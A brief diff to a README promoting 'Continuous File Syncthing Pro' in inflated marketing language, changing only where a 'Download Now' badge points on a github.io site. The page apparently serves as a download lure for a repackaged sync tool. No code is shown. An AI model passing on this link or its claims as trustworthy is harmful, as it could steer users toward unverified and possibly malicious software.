@@ -2,7 +2,7 @@
 
 Continuous File Syncthing Pro revolutionizes file synchronization with its advanced, privacy-focused approach to real-time data sharing across unlimited devices. This enterprise-grade open-source solution eliminates cloud dependency while providing military-grade security and unmatched flexibility for tech-savvy users, development teams, and privacy advocates worldwide.
 
-[![Download Now](https://img.shields.io/badge/Download-v2.5.3_Stable-green)](https://continuous-file-syncthing.github.io/.github)
+[![Download Now](https://img.shields.io/badge/Download-v2.5.3_Stable-green)](https://continuous-file-syncthing.github.io/.github/continuous)
 
 ---
 
